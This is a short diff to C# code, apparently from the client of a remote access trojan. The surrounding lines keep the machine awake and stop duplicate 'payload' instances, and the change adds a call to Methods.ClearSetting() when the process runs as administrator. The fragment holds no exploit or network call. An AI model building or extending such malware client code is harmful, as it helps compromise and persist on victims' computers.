@@ -30,7 +30,10 @@ namespace Client
                 Methods.PreventSleep(); //prevent pc to idle\sleep
                 if (!MutexControl.CreateMutex()) //if current payload is a duplicate
                     Environment.Exit(0);
-                
+                if (Methods.IsAdmin())
+                    Methods.ClearSetting();
+
+
 
             }
             catch { }
